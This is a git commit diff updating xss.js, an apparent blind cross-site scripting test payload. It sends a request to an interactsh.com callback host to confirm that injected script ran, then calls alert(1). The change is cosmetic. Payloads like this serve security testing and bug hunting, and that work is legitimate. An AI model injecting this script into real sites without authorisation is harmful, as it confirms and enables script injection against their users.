ebdda2242475b155944831187e604a6bb0d639b6
Stinger <75737187+Sachin-v3rma@users.noreply.github.com>
2021-10-17 21:01:15 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,5 @@
-alert(1);
-let xhr = new XMLHttpRequest();
-xhr.open('get', 'https://c5mry6r2vtc0000g0jtggn4cxdwyyyyyb.interactsh.com');
+var xhr = new XMLHttpRequest();
+xhr.open('get', 'https://c5mry6r2vtc0000g0jtggn4cxdwyyyyyb.interactsh.com/');
 xhr.send();
+
+alert(1);
